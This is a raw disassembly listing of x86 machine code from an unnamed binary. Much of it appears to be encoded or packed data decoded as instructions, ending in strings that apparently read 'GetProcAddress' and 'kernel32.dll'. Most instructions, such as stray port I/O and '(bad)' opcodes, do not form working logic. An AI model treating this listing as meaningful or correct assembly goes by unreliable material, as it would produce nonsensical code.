  421c04:	out    0xeb,al
  421c06:	jmp    0x421c66
  421c08:	mov    dl,0x71
  421c0a:	pushf  
  421c0b:	out    0xeb,al
  421c0d:	jmp    0x421c74
  421c0f:	mov    dl,0x71
  421c11:	popf   
  421c12:	out    0xeb,al
  421c14:	jmp    0x421c47
  421c16:	mov    dl,0x71
  421c18:	sahf   
  421c19:	out    0xeb,al
  421c1b:	jmp    0x421c77
  421c1d:	mov    dl,0x71
  421c1f:	lahf   
  421c20:	out    0xeb,al
  421c22:	jmp    0x421c84
  421c24:	mov    dl,0x71
  421c26:	mov    al,ds:0x5eebebe6
  421c2b:	mov    dl,0x71
  421c2d:	mov    eax,ds:0x65ebebe6
  421c32:	mov    dl,0x71
  421c34:	mov    ds:0x40ebebe6,al
  421c39:	mov    dl,0x71
  421c3b:	mov    ds:0x5bebebe6,eax
  421c40:	mov    dl,0x71
  421c42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c43:	out    0xeb,al
  421c45:	jmp    0x421c77
  421c47:	mov    dl,0x71
  421c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c4a:	out    0xeb,al
  421c4c:	jmp    0x421c9b
  421c4e:	mov    dl,0x71
  421c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c51:	out    0xeb,al
  421c53:	jmp    0x421cb5
  421c55:	mov    dl,0x71
  421c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c58:	out    0xeb,al
  421c5a:	jmp    0x421ca9
  421c5c:	mov    dl,0x71
  421c5e:	test   al,0xe6
  421c60:	jmp    0x421c4d
  421c62:	in     al,dx
  421c63:	jns    0x421cd6
  421c65:	mov    esi,fs
  421c67:	jmp    0x421c54
  421c69:	cmp    al,0x77
  421c6b:	jns    0x421bf1
  421c6d:	out    0xeb,al
  421c6f:	jmp    0x421cae
  421c71:	jmp    0x421bf4
  421c73:	inc    esp
  421c74:	out    0xeb,eax
  421c76:	jmp    0x421ced
  421c78:	jno    0x421cbe
  421c7a:	jmp    0x421c67
  421c7c:	jmp    0x421cf5
  421c7e:	add    DWORD PTR [esi+eiz*8-0x7e8a1415],0xebebeb18
  421c89:	ja     0x421cfc
  421c8b:	sbb    bl,ch
  421c8d:	jmp    0x421c7a
  421c8f:	ja     0x421d0a
  421c91:	test   dh,ah
  421c93:	jmp    0x421c80
  421c95:	out    dx,eax
  421c96:	xor    al,0x28
  421c98:	jne    0x421d13
  421c9a:	fs call 0x81ba088b
  421ca0:	fs call 0xaeb00891
  421ca6:	in     al,0xec
  421ca8:	in     al,dx
  421ca9:	in     al,dx
  421caa:	jne    0x421c2d
  421cac:	xor    al,0xe6
  421cae:	jmp    0x421c9b
  421cb0:	ja     0x421d23
  421cb2:	xor    al,0xe6
  421cb4:	jmp    0x421ca1
  421cb6:	ja     0x421d31
  421cb8:	test   dh,ah
  421cba:	jmp    0x421ca7
  421cbc:	out    dx,eax
  421cbd:	xor    al,0xf8
  421cbf:	jne    0x421d3a
  421cc1:	cmp    al,0xe6
  421cc3:	jmp    0x421cb0
  421cc5:	ja     0x421c48
  421cc7:	xor    al,0xe6
  421cc9:	jmp    0x421cb6
  421ccb:	ja     0x421d3e
  421ccd:	cmp    al,0xe6
  421ccf:	jmp    0x421cbc
  421cd1:	out    dx,eax
  421cd2:	cs hlt 
  421cd4:	jne    0x421d47
  421cd6:	sub    dh,ah
  421cd8:	jmp    0x421cc5
  421cda:	mov    bl,0x71
  421cdc:	xor    dh,ah
  421cde:	jmp    0x421ccb
  421ce0:	in     al,dx
  421ce1:	in     al,dx
  421ce2:	in     al,dx
  421ce3:	in     al,dx
  421ce4:	mov    bl,0x71
  421ce6:	cmp    dh,ah
  421ce8:	jmp    0x421cd5
  421cea:	in     al,dx
  421ceb:	in     al,dx
  421cec:	in     al,dx
  421ced:	in     al,dx
  421cee:	mov    bl,0x71
  421cf0:	sub    al,0xe6
  421cf2:	jmp    0x421cdf
  421cf4:	in     al,dx
  421cf5:	in     al,dx
  421cf6:	in     al,dx
  421cf7:	in     al,dx
  421cf8:	ja     0x421d73
  421cfa:	cmp    al,0xe6
  421cfc:	jmp    0x421ce9
  421cfe:	daa    
  421cff:	jns    0x421d29
  421d01:	out    0xeb,al
  421d03:	jmp    0x421d00
  421d05:	outs   dx,DWORD PTR ds:[esi]
  421d06:	scas   al,BYTE PTR es:[edi]
  421d07:	out    dx,al
  421d08:	in     al,dx
  421d09:	in     al,dx
  421d0a:	outs   dx,DWORD PTR ds:[esi]
  421d0b:	test   eax,0xebebe62c
  421d10:	in     al,dx
  421d11:	sti    
  421d12:	jno    0x421cb5
  421d14:	out    dx,al
  421d15:	in     al,dx
  421d16:	in     al,dx
  421d17:	ja     0x421c9a
  421d19:	cmp    al,0xe6
  421d1b:	jmp    0x421d08
  421d1d:	sti    
  421d1e:	mov    ds:0xecd429ee,al
  421d23:	in     al,dx
  421d24:	in     al,dx
  421d25:	sti    
  421d26:	jno    0x421da1
  421d28:	out    dx,al
  421d29:	in     al,dx
  421d2a:	in     al,dx
  421d2b:	ja     0x421da6
  421d2d:	cmp    al,0xe6
  421d2f:	jmp    0x421d1c
  421d31:	outs   dx,DWORD PTR ds:[esi]
  421d32:	lods   eax,DWORD PTR ds:[esi]
  421d33:	in     eax,dx
  421d34:	jne    0x421daf
  421d36:	cmp    al,0xe6
  421d38:	jmp    0x421d25
  421d3a:	ja     0x421cbd
  421d3c:	cmp    al,0xe6
  421d3e:	jmp    0x421d2b
  421d40:	ja     0x421d30
  421d42:	jne    0x421db5
  421d44:	xor    dh,ah
  421d46:	jmp    0x421d33
  421d48:	ja     0x421dc3
  421d4a:	cmp    al,0xe6
  421d4c:	jmp    0x421d39
  421d4e:	outs   dx,DWORD PTR ds:[esi]
  421d4f:	lods   eax,DWORD PTR ds:[esi]
  421d50:	lock jne 0x421dcc
  421d53:	cmp    al,0xe6
  421d55:	jmp    0x421d42
  421d57:	ja     0x421cda
  421d59:	cmp    al,0xe6
  421d5b:	jmp    0x421d48
  421d5d:	out    dx,eax
  421d5e:	xor    DWORD PTR [eax],0x27ebebe6
  421d64:	add    DWORD PTR [ebx+ebp*8-0x15],0x3571fbeb
  421d6c:	out    dx,al
  421d6d:	in     al,dx
  421d6e:	in     al,dx
  421d6f:	mov    bl,0x71
  421d71:	xor    dh,ah
  421d73:	jmp    0x421d60
  421d75:	in     al,dx
  421d76:	in     al,dx
  421d77:	in     al,dx
  421d78:	in     al,dx
  421d79:	ja     0x421dec
  421d7b:	cmp    al,0xe6
  421d7d:	jmp    0x421d6a
  421d7f:	jne    0x421df2
  421d81:	and    dh,ah
  421d83:	jmp    0x421d70
  421d85:	mov    bl,0x71
  421d87:	sbb    al,0xe6
  421d89:	jmp    0x421d76
  421d8b:	in     al,dx
  421d8c:	in     al,dx
  421d8d:	in     al,dx
  421d8e:	in     al,dx
  421d8f:	xlat   BYTE PTR ds:[ebx]
  421d90:	sti    
  421d91:	ja     0x421e0c
  421d93:	sbb    al,0xe6
  421d95:	jmp    0x421d82
  421d97:	outs   dx,DWORD PTR ds:[esi]
  421d98:	lods   eax,DWORD PTR ds:[esi]
  421d99:	in     eax,dx
  421d9a:	jne    0x421e15
  421d9c:	sbb    al,0xe6
  421d9e:	jmp    0x421d8b
  421da0:	outs   dx,DWORD PTR ds:[esi]
  421da1:	test   eax,0xebebe61c
  421da6:	or     al,0xfb
  421da8:	outs   dx,DWORD PTR ds:[esi]
  421da9:	jmp    0x421d98
  421dab:	in     al,dx
  421dac:	in     al,dx
  421dad:	outs   dx,DWORD PTR ds:[esi]
  421dae:	test   eax,0xebebe62c
  421db3:	in     al,dx
  421db4:	sti    
  421db5:	jno    0x421d95
  421db7:	in     eax,dx
  421db8:	in     al,dx
  421db9:	in     al,dx
  421dba:	ja     0x421d3d
  421dbc:	cmp    al,0xe6
  421dbe:	jmp    0x421dab
  421dc0:	outs   dx,DWORD PTR ds:[esi]
  421dc1:	(bad)  
  421dc2:	in     eax,dx
  421dc3:	jne    0x421d46
  421dc5:	cmp    al,0xe6
  421dc7:	jmp    0x421db4
  421dc9:	ja     0x421e3c
  421dcb:	cmp    al,0xe6
  421dcd:	jmp    0x421dba
  421dcf:	push   edx
  421dd0:	ja     0x421dc6
  421dd2:	push   edx
  421dd3:	jne    0x421e4e
  421dd5:	and    al,0xe6
  421dd7:	jmp    0x421dc4
  421dd9:	sti    
  421dda:	mov    ds:0xebe62481,eax
  421ddf:	jmp    0x421e4e
  421de1:	out    0x56,al
  421de3:	cmc    
  421de4:	in     al,dx
  421de5:	in     al,dx
  421de6:	sti    
  421de7:	jno    0x421d90
  421de9:	in     eax,dx
  421dea:	in     al,dx
  421deb:	in     al,dx
  421dec:	ja     0x421e5f
  421dee:	cmp    al,0xe6
  421df0:	jmp    0x421ddd
  421df2:	jne    0x421e65
  421df4:	sbb    dh,ah
  421df6:	jmp    0x421de3
  421df8:	ja     0x421e73
  421dfa:	cmp    dh,ah
  421dfc:	jmp    0x421de9
  421dfe:	outs   dx,DWORD PTR ds:[esi]
  421dff:	lods   eax,DWORD PTR ds:[esi]
  421e00:	in     eax,dx
  421e01:	jne    0x421e7c
  421e03:	cmp    dh,ah
  421e05:	jmp    0x421df2
  421e07:	outs   dx,DWORD PTR ds:[esi]
  421e08:	test   eax,0xebebe7c0
  421e0d:	icebp  
  421e0e:	pop    esi
  421e0f:	add    DWORD PTR [edi-0x57],ebp
  421e12:	(bad)  
  421e13:	out    0xeb,eax
  421e15:	jmp    0x421e04
  421e17:	pop    esi
  421e18:	clc    
  421e19:	sti    
  421e1a:	mov    ds:0xebe85081,eax
  421e1f:	jmp    0x421e90
  421e21:	out    0xed,al
  421e23:	imul   edi,ecx,0x6f
  421e26:	test   eax,0xebebe7c0
  421e2b:	icebp  
  421e2c:	sti    
  421e2d:	jb     0x421e40
  421e2f:	in     eax,dx
  421e30:	in     al,dx
  421e31:	in     al,dx
  421e32:	outs   dx,DWORD PTR ds:[esi]
  421e33:	test   eax,0xebebe7c0
  421e38:	icebp  
  421e39:	popa   
  421e3a:	cmc    
  421e3b:	outs   dx,DWORD PTR ds:[esi]
  421e3c:	test   eax,0xebebe7c4
  421e41:	out    dx,al
  421e42:	pusha  
  421e43:	imul   ebp,DWORD PTR [edi-0x57],0xebebe638
  421e4a:	out    dx,al
  421e4b:	pusha  
  421e4c:	(bad)  
  421e4d:	outs   dx,DWORD PTR ds:[esi]
  421e4e:	test   eax,0xebebe7c0
  421e53:	icebp  
  421e54:	popa   
  421e55:	push   edx
  421e56:	outs   dx,DWORD PTR ds:[esi]
  421e57:	test   eax,0xebebe638
  421e5c:	in     eax,dx
  421e5d:	popa   
  421e5e:	dec    ecx
  421e5f:	mov    bl,0x71
  421e61:	adc    al,0xe6
  421e63:	jmp    0x421e50
  421e65:	in     al,dx
  421e66:	in     al,dx
  421e67:	in     al,dx
  421e68:	in     al,dx
  421e69:	ja     0x421edc
  421e6b:	sbb    dh,ah
  421e6d:	jmp    0x421e5a
  421e6f:	sti    
  421e70:	mov    ds:0x7ce56df4,al
  421e75:	in     al,dx
  421e76:	in     al,dx
  421e77:	in     al,dx
  421e78:	popa   
  421e79:	sti    
  421e7a:	ja     0x421dfd
  421e7c:	adc    al,0xe6
  421e7e:	jmp    0x421e6b
  421e80:	outs   dx,DWORD PTR ds:[esi]
  421e81:	scas   al,BYTE PTR es:[edi]
  421e82:	in     eax,dx
  421e83:	jne    0x421e06
  421e85:	adc    al,0xe6
  421e87:	jmp    0x421e74
  421e89:	ja     0x421efc
  421e8b:	sbb    dh,ah
  421e8d:	jmp    0x421e7a
  421e8f:	outs   dx,DWORD PTR ds:[esi]
  421e90:	aam    0xed
  421e92:	jne    0x421f05
  421e94:	sbb    dh,ah
  421e96:	jmp    0x421e83
  421e98:	outs   dx,DWORD PTR ds:[esi]
  421e99:	test   eax,0xebebe614
  421e9e:	lock pop esi
  421ea0:	mov    ah,0x6f
  421ea2:	test   eax,0xebebe614
  421ea7:	lock popa 
  421ea9:	(bad)  
  421eaa:	ja     0x421f25
  421eac:	sbb    dh,ah
  421eae:	jmp    0x421e9b
  421eb0:	jmp    0x421e6f
  421eb2:	mov    bl,0x71
  421eb4:	sub    al,0xe6
  421eb6:	jmp    0x421ea3
  421eb8:	in     eax,dx
  421eb9:	in     al,dx
  421eba:	in     al,dx
  421ebb:	in     al,dx
  421ebc:	aad    0x80
  421ebe:	in     al,dx
  421ebf:	in     al,dx
  421ec0:	in     al,dx
  421ec1:	mov    bl,0x71
  421ec3:	adc    dh,ah
  421ec5:	jmp    0x421eb2
  421ec7:	in     al,dx
  421ec8:	in     al,dx
  421ec9:	in     al,dx
  421eca:	in     al,dx
  421ecb:	ja     0x421f46
  421ecd:	sbb    dh,ah
  421ecf:	jmp    0x421ebc
  421ed1:	sti    
  421ed2:	mov    ds:0x7ce66dfd,al
  421ed7:	in     al,dx
  421ed8:	in     al,dx
  421ed9:	in     al,dx
  421eda:	popa   
  421edb:	sti    
  421edc:	ja     0x421f4f
  421ede:	adc    dh,ah
  421ee0:	jmp    0x421ecd
  421ee2:	outs   dx,DWORD PTR ds:[esi]
  421ee3:	lods   al,BYTE PTR ds:[esi]
  421ee4:	in     eax,dx
  421ee5:	jne    0x421f58
  421ee7:	adc    dh,ah
  421ee9:	jmp    0x421ed6
  421eeb:	ja     0x421f66
  421eed:	sbb    dh,ah
  421eef:	jmp    0x421edc
  421ef1:	outs   dx,DWORD PTR ds:[esi]
  421ef2:	aad    0xed
  421ef4:	jne    0x421f6f
  421ef6:	sbb    dh,ah
  421ef8:	jmp    0x421ee5
  421efa:	outs   dx,DWORD PTR ds:[esi]
  421efb:	test   eax,0xebebe610
  421f00:	lock pop esi
  421f02:	mov    ah,0x6f
  421f04:	test   eax,0xebebe610
  421f09:	lock popa 
  421f0b:	xor    eax,0xd9aadba4
  421f10:	jmp    0xebeb:0xe6187177
  421f17:	ja     0x421e9a
  421f19:	sbb    dh,ah
  421f1b:	jmp    0x421f08
  421f1d:	sti    
  421f1e:	mov    ds:0x7729f12e,al
  421f23:	in     al,dx
  421f24:	in     al,dx
  421f25:	in     al,dx
  421f26:	popa   
  421f27:	sbb    DWORD PTR [edi+0x79],esi
  421f2a:	sbb    dh,ah
  421f2c:	jmp    0x421f19
  421f2e:	sti    
  421f2f:	mov    ds:0xe66df23d,al
  421f34:	jmp    0x421f22
  421f36:	in     al,dx
  421f37:	in     al,dx
  421f38:	popa   
  421f39:	pop    es
  421f3a:	outs   dx,DWORD PTR ds:[esi]
  421f3b:	test   eax,0xebebe610
  421f40:	lock popa 
  421f42:	(bad)  
  421f43:	ja     0x421fbe
  421f45:	sbb    dh,ah
  421f47:	jmp    0x421f34
  421f49:	jmp    0x421f08
  421f4b:	mov    bl,0x71
  421f4d:	sub    al,0xe6
  421f4f:	jmp    0x421f3c
  421f51:	in     eax,dx
  421f52:	in     al,dx
  421f53:	in     al,dx
  421f54:	in     al,dx
  421f55:	xlat   BYTE PTR ds:[ebx]
  421f56:	cmp    al,0xb3
  421f58:	jno    0x421f66
  421f5a:	out    0xeb,al
  421f5c:	jmp    0x421f9b
  421f5e:	cmp    eax,0x71b3413f
  421f63:	sub    al,0xe6
  421f65:	jmp    0x421f52
  421f67:	in     al,dx
  421f68:	in     al,dx
  421f69:	in     al,dx
  421f6a:	in     al,dx
  421f6b:	ja     0x421fde
  421f6d:	sbb    dh,ah
  421f6f:	jmp    0x421f5c
  421f71:	ja     0x421fec
  421f73:	or     al,0xe6
  421f75:	jmp    0x421f62
  421f77:	daa    
  421f78:	hlt    
  421f79:	popa   
  421f7a:	clc    
  421f7b:	mov    bl,0x71
  421f7d:	sub    al,0xe6
  421f7f:	jmp    0x421f6c
  421f81:	in     eax,dx
  421f82:	in     al,dx
  421f83:	in     al,dx
  421f84:	in     al,dx
  421f85:	xlat   BYTE PTR ds:[ebx]
  421f86:	sti    
  421f87:	ja     0x421f0a
  421f89:	sbb    dh,ah
  421f8b:	jmp    0x421f78
  421f8d:	outs   dx,DWORD PTR ds:[esi]
  421f8e:	(bad)  
  421f8f:	in     eax,dx
  421f90:	jne    0x421f13
  421f92:	sbb    dh,ah
  421f94:	jmp    0x421f81
  421f96:	outs   dx,DWORD PTR ds:[esi]
  421f97:	test   eax,0xebebe62c
  421f9c:	in     al,dx
  421f9d:	pusha  
  421f9e:	mov    eax,0xe6187977
  421fa3:	jmp    0x421f90
  421fa5:	jmp    0x421f64
  421fa7:	aad    0xd1
  421fa9:	jmp    0x71ba0b99
  421fae:	and    dh,ah
  421fb0:	jmp    0x421f9d
  421fb2:	jne    0x422025
  421fb4:	cmp    al,0xe6
  421fb6:	jmp    0x421fa3
  421fb8:	ja     0x422033
  421fba:	cmp    al,0xe6
  421fbc:	jmp    0x421fa9
  421fbe:	outs   dx,DWORD PTR ds:[esi]
  421fbf:	lods   eax,DWORD PTR ds:[esi]
  421fc0:	in     eax,dx
  421fc1:	jne    0x42203c
  421fc3:	cmp    al,0xe6
  421fc5:	jmp    0x421fb2
  421fc7:	aad    0x18
  421fc9:	jmp    0x74970bb9
  421fce:	(bad)  
  421fcf:	in     al,dx
  421fd0:	in     al,dx
  421fd1:	jmp    0x422014
  421fd3:	in     al,0x77
  421fd5:	sbb    DWORD PTR [ebx+ebp*8],0xb077ebeb
  421fdc:	push   edx
  421fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fde:	js     0x421fcb
  421fe0:	ja     0x421fae
  421fe2:	jmp    0x421fb2
  421fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fe5:	in     al,dx
  421fe6:	in     al,dx
  421fe7:	in     al,dx
  421fe8:	in     al,dx
  421fe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fea:	in     al,dx
  421feb:	in     al,dx
  421fec:	in     al,dx
  421fed:	in     al,dx
  421fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fef:	in     al,dx
  421ff0:	in     al,dx
  421ff1:	in     al,dx
  421ff2:	in     al,dx
  421ff3:	pop    ds
  421ff4:	lods   al,BYTE PTR ds:[esi]
  421ff5:	ja     0x421fc8
  421ff7:	dec    ecx
  421ff8:	scas   al,BYTE PTR es:[edi]
  421ff9:	hlt    
  421ffa:	in     al,dx
  421ffb:	inc    ecx
  421ffc:	ja     0x421fd6
  421ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  424e73:	add    BYTE PTR [edi+0x65],al
  424e76:	je     0x424ec8
  424e78:	jb     0x424ee9
  424e7a:	arpl   WORD PTR [ecx+0x64],ax
  424e7d:	fs jb  0x424ee5
  424e80:	jae    0x424ef5
  424e82:	add    BYTE PTR [eax],al
  424e84:	imul   esp,DWORD PTR [ebp+0x72],0x6e
  424e88:	gs ins BYTE PTR es:[edi],dx
  424e8a:	xor    esi,DWORD PTR [edx]
  424e8c:	cs fs ins BYTE PTR es:[edi],dx
  424e8f:	ins    BYTE PTR es:[edi],dx
	...
